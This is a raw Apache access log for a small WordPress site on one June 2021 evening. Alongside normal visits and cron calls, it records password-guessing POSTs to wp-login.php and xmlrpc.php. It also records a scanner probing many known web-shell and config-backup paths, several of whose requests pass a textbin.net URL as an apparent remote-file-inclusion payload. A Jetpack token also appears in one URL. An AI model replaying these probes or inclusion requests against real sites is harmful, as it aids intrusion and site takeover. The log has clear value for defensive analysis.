13.58.68.167 - - [28/Jun/2021:15:51:59 -0400] "GET /wp-content/plugins/under-construction-page/themes/css/bootstrap.min.css?v=3.88 HTTP/1.1" 200 24951 "https://bubandcompany.com/index.php/contact/" "Mozilla/5.0 (X11; CrOS x86_64 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36"
13.58.68.167 - - [28/Jun/2021:15:51:59 -0400] "GET /wp-content/plugins/under-construction-page/themes/mad_designer/mad-designer.png HTTP/1.1" 200 167167 "https://bubandcompany.com/index.php/contact/" "Mozilla/5.0 (X11; CrOS x86_64 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36"
13.58.68.167 - - [28/Jun/2021:15:51:59 -0400] "GET /wp-content/plugins/under-construction-page/themes/css/common.css?v=3.88 HTTP/1.1" 200 5535 "https://bubandcompany.com/index.php/contact/" "Mozilla/5.0 (X11; CrOS x86_64 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36"
13.58.68.167 - - [28/Jun/2021:15:51:59 -0400] "GET /wp-content/plugins/under-construction-page/themes/images/favicon.png HTTP/1.1" 200 9092 "https://bubandcompany.com/index.php/contact/" "Mozilla/5.0 (X11; CrOS x86_64 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36"
13.58.68.167 - - [28/Jun/2021:15:52:00 -0400] "GET /wp-content/plugins/under-construction-page/themes/css/font-awesome.min.css?v=3.88 HTTP/1.1" 200 12200 "https://bubandcompany.com/index.php/contact/" "Mozilla/5.0 (X11; CrOS x86_64 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36"
54.227.85.77 - - [28/Jun/2021:16:00:01 -0400] "POST /wp-login.php HTTP/1.1" 200 9936 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
106.52.193.254 - - [28/Jun/2021:16:03:10 -0400] "POST /wp-login.php HTTP/1.1" 200 9938 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
162.55.53.198 - - [28/Jun/2021:16:34:06 -0400] "POST /wp-login.php HTTP/1.1" 200 9936 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"
34.75.185.25 - - [28/Jun/2021:16:38:25 -0400] "GET /robots.txt HTTP/1.0" 301 563 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
34.75.185.25 - - [28/Jun/2021:16:38:25 -0400] "GET /robots.txt HTTP/1.1" 404 4952 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
34.75.185.25 - - [28/Jun/2021:16:38:25 -0400] "GET /wp-login.php HTTP/1.0" 301 567 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
34.75.185.25 - - [28/Jun/2021:16:38:25 -0400] "GET /robots.txt HTTP/1.0" 404 481 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
34.75.185.25 - - [28/Jun/2021:16:38:25 -0400] "GET /wp-login.php HTTP/1.0" 200 3001 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
204.48.19.85 - - [28/Jun/2021:16:38:26 -0400] "POST /wp-cron.php?doing_wp_cron=1624912706.7840099334716796875000 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624912706.7840099334716796875000" "WordPress/5.7.2; https://bubandcompany.com"
34.75.185.25 - - [28/Jun/2021:16:46:27 -0400] "GET /wp-login.php HTTP/1.0" 200 7358 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
192.0.99.28 - - [28/Jun/2021:16:46:30 -0400] "POST /xmlrpc.php?for=jetpack&token=%29%28dLwbcv%23b%21fiadHWlOCHmw%25nhq9rDir%3A1%3A0&timestamp=1624913190&nonce=N3t85t2bhZ&body-hash=u9PchwX6M0SaeiSzQKj%2F07xm4Ng%3D&signature=GHekhRw1%2BwvCVvE%2FPlRu4G26FeM%3D HTTP/1.1" 200 5387 "https://bubandcompany.com/xmlrpc.php?for=jetpack&token=%29%28dLwbcv%23b%21fiadHWlOCHmw%25nhq9rDir%3A1%3A0&timestamp=1624913190&nonce=N3t85t2bhZ&body-hash=u9PchwX6M0SaeiSzQKj%2F07xm4Ng%3D&signature=GHekhRw1%2BwvCVvE%2FPlRu4G26FeM%3D" "Jetpack by WordPress.com"
204.48.19.85 - - [28/Jun/2021:16:46:28 -0400] "POST /wp-cron.php?doing_wp_cron=1624913188.1463589668273925781250 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624913188.1463589668273925781250" "WordPress/5.7.2; https://bubandcompany.com"
171.25.193.20 - - [28/Jun/2021:16:53:52 -0400] "POST /xmlrpc.php HTTP/1.0" 301 600 "-" "Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.64 Mobile Safari/537.36"
204.48.19.85 - - [28/Jun/2021:16:53:55 -0400] "POST /wp-cron.php?doing_wp_cron=1624913635.1755299568176269531250 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624913635.1755299568176269531250" "WordPress/5.7.2; https://bubandcompany.com"
171.25.193.20 - - [28/Jun/2021:16:53:54 -0400] "POST /xmlrpc.php HTTP/1.0" 200 5505 "-" "Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.64 Mobile Safari/537.36"
117.50.90.31 - - [28/Jun/2021:17:03:51 -0400] "POST /wp-login.php HTTP/1.1" 200 9934 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
69.16.254.52 - - [28/Jun/2021:17:33:07 -0400] "POST /wp-login.php HTTP/1.1" 200 9936 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
136.243.71.5 - - [28/Jun/2021:17:56:37 -0400] "POST /wp-login.php HTTP/1.1" 200 9935 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
35.190.177.247 - - [28/Jun/2021:18:03:14 -0400] "GET /robots.txt HTTP/1.0" 301 563 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
35.190.177.247 - - [28/Jun/2021:18:03:14 -0400] "GET /robots.txt HTTP/1.1" 404 4952 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
35.190.177.247 - - [28/Jun/2021:18:03:14 -0400] "GET /wp-login.php HTTP/1.0" 301 567 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
35.190.177.247 - - [28/Jun/2021:18:03:14 -0400] "GET /robots.txt HTTP/1.0" 404 481 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
204.48.19.85 - - [28/Jun/2021:18:03:16 -0400] "POST /wp-cron.php?doing_wp_cron=1624917795.9952230453491210937500 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624917795.9952230453491210937500" "WordPress/5.7.2; https://bubandcompany.com"
35.190.177.247 - - [28/Jun/2021:18:03:14 -0400] "GET /wp-login.php HTTP/1.0" 200 3001 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
202.172.28.184 - - [28/Jun/2021:18:04:15 -0400] "POST /wp-login.php HTTP/1.1" 200 9937 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"
204.48.19.85 - - [28/Jun/2021:18:05:34 -0400] "POST /wp-cron.php?doing_wp_cron=1624917934.9012129306793212890625 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624917934.9012129306793212890625" "WordPress/5.7.2; https://bubandcompany.com"
78.46.210.120 - - [28/Jun/2021:18:05:34 -0400] "GET /wp-admin/install.php?step=1 HTTP/1.1" 200 6027 "-" "Apache/2.4.34 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
204.48.19.85 - - [28/Jun/2021:18:11:11 -0400] "POST /wp-cron.php?doing_wp_cron=1624918271.8300099372863769531250 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624918271.8300099372863769531250" "WordPress/5.7.2; https://bubandcompany.com"
35.190.177.247 - - [28/Jun/2021:18:11:11 -0400] "GET /wp-login.php HTTP/1.0" 200 7358 "-" "ZoominfoBot (zoominfobot at zoominfo dot com)"
185.26.156.64 - - [28/Jun/2021:18:21:42 -0400] "POST /wp-login.php HTTP/1.1" 200 9937 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
54.39.105.88 - - [28/Jun/2021:19:00:27 -0400] "POST /wp-login.php HTTP/1.1" 200 9936 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
49.232.109.167 - - [28/Jun/2021:19:03:28 -0400] "POST /wp-login.php HTTP/1.1" 200 9938 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
35.228.237.163 - - [28/Jun/2021:19:21:03 -0400] "POST /wp-login.php HTTP/1.1" 200 9938 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
89.163.252.230 - - [28/Jun/2021:19:29:56 -0400] "POST /xmlrpc.php HTTP/1.0" 301 600 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"
204.48.19.85 - - [28/Jun/2021:19:29:59 -0400] "POST /wp-cron.php?doing_wp_cron=1624922999.1075921058654785156250 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624922999.1075921058654785156250" "WordPress/5.7.2; https://bubandcompany.com"
89.163.252.230 - - [28/Jun/2021:19:29:58 -0400] "POST /xmlrpc.php HTTP/1.0" 200 5505 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"
45.167.178.72 - - [28/Jun/2021:19:40:24 -0400] "POST /wp-login.php HTTP/1.1" 200 9936 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
198.71.239.40 - - [28/Jun/2021:19:41:21 -0400] "GET /wp-admin/setup-config.php HTTP/1.1" 409 7595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
13.58.68.167 - - [28/Jun/2021:19:52:56 -0400] "GET /index.php/contact/ HTTP/1.1" 200 5797 "-" "Mozilla/5.0 (X11; CrOS x86_64 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36"
204.48.19.85 - - [28/Jun/2021:19:52:58 -0400] "GET /index.php/wp-json/wp/v2/types/post?context=edit HTTP/1.1" 401 5892 "https://bubandcompany.com/index.php/wp-json/wp/v2/types/post?context=edit" "WordPress/5.7.2; https://bubandcompany.com"
13.58.68.167 - - [28/Jun/2021:19:52:58 -0400] "GET /wp-login.php HTTP/1.1" 200 7823 "https://bubandcompany.com/index.php/contact/" "Mozilla/5.0 (X11; CrOS x86_64 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36"
204.48.19.85 - - [28/Jun/2021:19:52:59 -0400] "POST /wp-cron.php HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php" "WordPress/5.7.2; https://bubandcompany.com"
13.58.68.167 - - [28/Jun/2021:19:52:59 -0400] "GET /wp-content/plugins/under-construction-page/themes/mad_designer/style.css?v=3.88 HTTP/1.1" 200 5798 "https://bubandcompany.com/index.php/contact/" "Mozilla/5.0 (X11; CrOS x86_64 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36"
13.58.68.167 - - [28/Jun/2021:19:52:59 -0400] "GET /wp-content/plugins/under-construction-page/themes/css/bootstrap.min.css?v=3.88 HTTP/1.1" 200 24951 "https://bubandcompany.com/index.php/contact/" "Mozilla/5.0 (X11; CrOS x86_64 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36"
13.58.68.167 - - [28/Jun/2021:19:52:59 -0400] "GET /wp-content/plugins/under-construction-page/themes/mad_designer/mad-designer.png HTTP/1.1" 200 167167 "https://bubandcompany.com/index.php/contact/" "Mozilla/5.0 (X11; CrOS x86_64 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36"
13.58.68.167 - - [28/Jun/2021:19:53:00 -0400] "GET /wp-content/plugins/under-construction-page/themes/css/common.css?v=3.88 HTTP/1.1" 200 5535 "https://bubandcompany.com/index.php/contact/" "Mozilla/5.0 (X11; CrOS x86_64 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36"
13.58.68.167 - - [28/Jun/2021:19:53:00 -0400] "GET /wp-content/plugins/under-construction-page/themes/images/favicon.png HTTP/1.1" 200 9092 "https://bubandcompany.com/index.php/contact/" "Mozilla/5.0 (X11; CrOS x86_64 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36"
13.58.68.167 - - [28/Jun/2021:19:53:00 -0400] "GET /wp-content/plugins/under-construction-page/themes/css/font-awesome.min.css?v=3.88 HTTP/1.1" 200 12200 "https://bubandcompany.com/index.php/contact/" "Mozilla/5.0 (X11; CrOS x86_64 10323.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.209 Safari/537.36"
204.48.19.85 - - [28/Jun/2021:19:52:59 -0400] "GET / HTTP/1.1" 200 6282 "https://bubandcompany.com/" "WordPress/5.7.2; https://bubandcompany.com"
204.48.19.85 - - [28/Jun/2021:19:52:57 -0400] "POST /wp-cron.php?doing_wp_cron=1624924377.5288848876953125000000 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624924377.5288848876953125000000" "WordPress/5.7.2; https://bubandcompany.com"
194.247.179.164 - - [28/Jun/2021:20:00:12 -0400] "POST /wp-login.php HTTP/1.1" 200 9938 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36"
3.25.67.144 - - [28/Jun/2021:20:02:23 -0400] "GET /wp-login.php; HTTP/1.1" 404 4967 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
204.48.19.85 - - [28/Jun/2021:20:16:11 -0400] "POST /wp-cron.php?doing_wp_cron=1624925771.9107789993286132812500 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624925771.9107789993286132812500" "WordPress/5.7.2; https://bubandcompany.com"
157.55.39.69 - - [28/Jun/2021:20:16:11 -0400] "GET /index.php/shop/?product_count=12&product_order=desc HTTP/1.1" 200 5799 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
107.180.102.72 - - [28/Jun/2021:20:23:12 -0400] "POST /wp-login.php HTTP/1.1" 200 9937 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
52.66.54.230 - - [28/Jun/2021:20:43:37 -0400] "POST /wp-login.php HTTP/1.1" 200 9937 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36"
148.72.232.125 - - [28/Jun/2021:21:11:27 -0400] "GET /shell.php HTTP/1.1" 301 542 "http://simplesite.com" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4"
148.72.232.125 - - [28/Jun/2021:21:11:29 -0400] "GET /shell.php HTTP/1.1" 404 5664 "http://bubandcompany.com/shell.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4"
46.160.121.111 - - [28/Jun/2021:21:48:18 -0400] "POST /wp-login.php HTTP/1.1" 200 9937 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36"
94.73.142.2 - - [28/Jun/2021:22:00:51 -0400] "POST /wp-login.php HTTP/1.1" 200 9935 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:08:16 -0400] "GET /style.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:08:18 -0400] "GET /moduless.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:08:20 -0400] "GET /wp-content/plugins/t_file_wp/t_file_wp.php?test=hello HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:08:22 -0400] "GET /admin.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:08:26 -0400] "GET /index.php?3x=3x HTTP/1.1" 200 5846 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
204.48.19.85 - - [28/Jun/2021:22:08:28 -0400] "GET / HTTP/1.1" 200 6282 "https://bubandcompany.com/" "WordPress/5.7.2; https://bubandcompany.com"
204.48.19.85 - - [28/Jun/2021:22:08:27 -0400] "POST /wp-cron.php?doing_wp_cron=1624932507.5561308860778808593750 HTTP/1.1" 200 5389 "https://bubandcompany.com/wp-cron.php?doing_wp_cron=1624932507.5561308860778808593750" "WordPress/5.7.2; https://bubandcompany.com"
157.90.85.34 - - [28/Jun/2021:22:08:34 -0400] "GET /boom.php?x HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:08:36 -0400] "GET /wp-content/plugins/backup_index.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:08:39 -0400] "GET /wp-content/db_cache.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:08:41 -0400] "GET /wp-content/plugins/ioptimization/IOptimize.php?rchk HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:08:43 -0400] "GET /xmlrp.php?url=https://textbin.net/raw/duoe0flosv HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:08:46 -0400] "GET /wpindex.php?idb=https://textbin.net/raw/duoe0flosv HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:08:48 -0400] "GET /larva.php?idb=https://textbin.net/raw/duoe0flosv HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:08:51 -0400] "GET /th3_err0r.php?php=https://textbin.net/raw/duoe0flosv HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:08:52 -0400] "GET /alfindex.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:08:55 -0400] "GET /alfa.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:08:57 -0400] "GET /wp-booking.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:08:59 -0400] "GET /cindex.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:03 -0400] "GET /wp-content/wp-1ogin_bak.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:06 -0400] "GET /wp-1ogin_bak.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:09 -0400] "GET /wp-includes/fonts/css.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:12 -0400] "GET /wp-includes/css/css.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:14 -0400] "GET /old-index.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:18 -0400] "GET /config.bak.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:20 -0400] "GET /wp-admin/config.bak.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:24 -0400] "GET /wp-content/config.bak.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:26 -0400] "GET /wp-includes/config.bak.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:28 -0400] "GET /wp-content/themes/config.bak.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:30 -0400] "GET /wp-content/plugins/config.bak.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:32 -0400] "POST /wp-includes/css/wp-config.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:34 -0400] "GET /wp-content/plugins/ubh/up.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:37 -0400] "GET /wp-includes/wpconfig.bak.php?act=sf HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:40 -0400] "GET /wp-content/plugins/wpconfig.bak.php?act=sf HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:42 -0400] "GET /haders.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:44 -0400] "GET /wp-content/wp-old-index.php?action=login&pass=-1&submit= HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:45 -0400] "GET /legion.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:48 -0400] "GET /wp-content/mu-plugins/db-safe-mode.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:50 -0400] "GET /wp-includes/lfx.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:52 -0400] "GET /wp-includes/small.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:54 -0400] "GET /up.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
